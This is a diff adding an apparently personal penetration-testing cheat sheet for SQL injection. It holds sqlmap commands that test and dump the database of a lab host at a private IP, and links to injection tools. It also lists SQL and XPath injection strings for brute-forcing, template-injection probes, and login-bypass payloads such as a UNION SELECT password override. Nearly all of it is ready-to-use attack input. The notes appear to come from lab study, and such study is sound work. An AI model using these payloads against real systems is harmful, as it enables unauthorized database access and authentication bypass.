@@ -1,0 +1,90 @@
+🗲SqlMap
+  #sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user  -> Testing on parameter names "user", we'll get confirmation
+  #sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --dump  -> Dumping database
+
+🗲Ghauri (https://github.com/r0oth3x49/ghauri)
+
+🗲SqlFinder (https://github.com/americo/sqlifinder/tree/main)
+
+🗲Blisqy (https://github.com/JohnTroony/Blisqy)
+
+
+#(Knowing what database we are dealing with makes it easier to understand how to construct our malicious queries)
+
+
+
+🗲test🗲
+!!!Do brute force with this payload and check the length of the page.
+" or "1"+"2
+" or "1"="-2"--
+" or "1+2"/*
+" or "1"="1
+" or "1"="1"--
+" or "1"="1"/*
+" or "1"="1"#
+" or 1=1
+" or 1=1 --
+" or 1=1 -
+" or 1=1--
+" or 1=1/*
+" or 1=1#
+" or 1=1-
+' or '1'='1
+' or ''=''
+' or 1]%00
+' or /* or '
+' or "a" or '
+' or 1 or '
+' or true() or '
+{7*7}
+*{7*7}
+{{7*7}}
+[[7*7]]
+${7*7}
+@(7*7)
+<?=7*7?>
+<%= 7*7 %>
+${= 7*7}
+{{= 7*7}}
+${{7*7}}
+#{7*7}
+[=7*7]
+
+  
+🗲Login Page🗲
+USERNAME : admin' UNION SELECT '12345' AS password#    PASSWORD : 12345
+admin' or '1'='1
+" or "1"="1
+" or "1"="1"--
+" or "1"="1"/*
+" or "1"="1"#
+" or 1=1
+" or 1=1 --
+" or 1=1 -
+" or 1=1--
+" or 1=1/*
+" or 1=1#
+" or 1=1-
+' or '1'='1
+' or ''=''
+' or 1]%00
+' or /* or '
+' or "a" or '
+' or 1 or '
+' or true() or '
+'or string-length(name(.))<10 or'
+'or contains(name,'adm') or'
+'or contains(.,'adm') or'
+'or position()=2 or'
+admin' or '
+admin' or '1'='2
+") or "1"="1
+") or "1"="1"--
+") or "1"="1"/*
+") or "1"="1"#
+") or ("1"="1
+") or ("1"="1"--
+") or ("1"="1"/*
+") or ("1"="1"#
+) or '1`='1-
+or 1=1 group by round(rand(0)) having min(0);#
